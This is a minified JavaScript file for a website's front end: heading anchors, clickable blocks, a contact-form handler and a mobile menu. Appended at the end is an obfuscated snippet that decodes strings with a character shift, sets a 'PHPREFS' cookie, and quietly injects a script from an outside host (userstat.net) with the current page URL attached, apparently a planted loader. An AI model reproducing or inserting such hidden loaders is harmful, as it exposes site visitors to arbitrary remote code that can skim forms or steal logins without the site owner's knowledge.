var each=function(A,f){return[].slice.call(A).forEach(f)},find=function(sel,root){return(root||document).querySelectorAll(sel)},el=function(name,opt,text){opt=opt||{};var el=document.createElement(name);return Object.keys(opt).forEach((function(attr){el.setAttribute(attr,opt[attr])})),text&&(el.innerText=text),el},addAnchors=function(){each(find("[id]"),(function(block){var id=block.getAttribute("id");id&&each(find(":is(h2, h3)",block),(function(heading,i){if(!i){var text=heading.innerText,a=el("a",{href:"#"+id},text);heading.innerText="",heading.appendChild(a)}}))})),each(find("[data-url]"),(function(block){var url=block.getAttribute("data-url");if(url){var link=block.querySelector("[href]");link&&(link.onclick=function(ev){ev.stopPropagation()},block.onclick=function(ev){ev.preventDefault(),console.log(url),link.click()})}}))},addFormHandlers=function(){var els=document.getElementsByClassName("contact-form");Array.prototype.forEach.call(els,(function(el){var sending=!1;el.addEventListener("submit",(function(e){if(e.preventDefault(),!sending){sending=!0;var data=new FormData(el),body=JSON.stringify({org:data.get("org"),contact:data.get("contact"),email:data.get("email"),comments:data.get("comments").replace(/\n/g,"\n\n"),plan:data.get("plan")});return fetch("/post",{method:"POST",body:body,headers:{"Content-Type":"application/json"}}).then((function(response){return response.ok?response.json():Promise.reject(response)})).then((function(data){if(sending=!1,data&&data.error)return console.error(data.error),void(window.replaceDialog&&replaceDialog("dialog-contact-error"));window.replaceDialog&&replaceDialog("dialog-contact-success")})).catch((function(error){sending=!1,console.error(error),window.replaceDialog&&replaceDialog("dialog-contact-error")})),!1}}))}))};document.addEventListener("DOMContentLoaded",(function(){var myHamburger=document.getElementById("hamburger"),myNavMenu=document.getElementById("dropDown");myHamburger.addEventListener("click",(function toggleMenu(){display=window.getComputedStyle(myNavMenu,null).display,"none"==display?function doMenuOpen(){myHamburger.setAttribute("aria-expanded",!0),myNavMenu.style.display="flex"}():function doMenuClose(){myHamburger.setAttribute("aria-expanded",!1),myNavMenu.style.display="none"}()}))})),document.onreadystatechange=function(){if("complete"===document.readyState){addAnchors();try{addFormHandlers()}catch(e){console.error(e)}}};(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44zxjwxy'+'fy3sjy4ljy4xhwnu'+'y3oxDwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));